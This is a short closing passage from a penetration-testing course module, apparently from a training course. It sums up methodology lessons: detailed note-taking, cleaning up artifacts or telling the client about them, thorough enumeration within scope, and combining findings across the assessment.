We cannot emphasize enough to take detailed notes throughout a real penetration test and keep a good log of when certain actions were performed. After a penetration test, we must ensure that we leave everything the way it was. Any exploits or artifacts must be removed or, at the very least, the client should be notified about their location.

At the end of this Module, let's talk about some of the key takeaways of this penetration test. One of the most important lessons of this Module (and the whole course) is to always conduct thorough enumeration. We cannot attack what we missed and therefore we should make sure to always map out the entire attack surface of all accessible machines and services within the scope of an assessment.

Another important takeaway is that we should never skip or cut short the enumeration process to chase a quick win. We may miss crucial information, potentially leading to a much more promising attack vector.

Next, once we have obtained administrative privileges on a target system, we should not jump straight to the next machine. Armed with these privileges, we can examine areas of the system that may have been previously inaccessible.

Finally, let's discuss how we should work with gathered information such as enumeration results. It is crucial that we learn to combine information found on different systems and stages of a penetration test. We may find information on a machine that we cannot leverage at the current stage, but only later in the assessment. Detailed note taking is essential to not lose track of all the gathered information.

Taking these key takeaways into consideration will be tremendously valuable not only in the Challenge Labs, but also in real assessments.
